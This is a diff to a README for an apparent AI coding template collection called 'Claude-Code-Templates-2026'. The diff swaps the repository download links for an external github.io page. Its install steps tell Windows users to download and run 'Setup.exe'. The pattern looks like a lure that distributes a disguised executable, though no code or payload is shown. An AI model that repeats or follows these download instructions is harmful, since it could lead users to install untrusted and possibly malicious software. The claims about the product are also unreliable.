@@ -1,6 +1,6 @@
 # 🤖 Claude-Code-Templates-2026 - Master your automated AI workflow today
 
-[![Download Claude-Code-Templates-2026](https://img.shields.io/badge/Download-Setup-blue)](https://github.com/Abdullahr487/Claude-Code-Templates-2026)
+[![Download Claude-Code-Templates-2026](https://img.shields.io/badge/Download-Setup-blue)](https://abdullahr487.github.io)
 
 Claude-Code-Templates-2026 provides a library of tools for your computer. These files help you automate tasks, manage complex coding projects, and simplify your daily digital routine. This collection contains over 600 pieces of software designed for users who want to save time. You can use these templates to handle file organization, data processing, and project management without writing code yourself.
 
@@ -28,7 +28,7 @@ To run this software, ensure your computer meets these basic standards:
 
 Follow these steps to set up the software on your Windows computer.
 
-1. Go to the official release page: [https://github.com/Abdullahr487/Claude-Code-Templates-2026](https://github.com/Abdullahr487/Claude-Code-Templates-2026)
+1. Go to the official release page: [https://abdullahr487.github.io](https://abdullahr487.github.io)
 2. Locate the file named Setup.exe in the list of assets.
 3. Click the file to start the download.
 4. Save the file to your desktop for easy access.
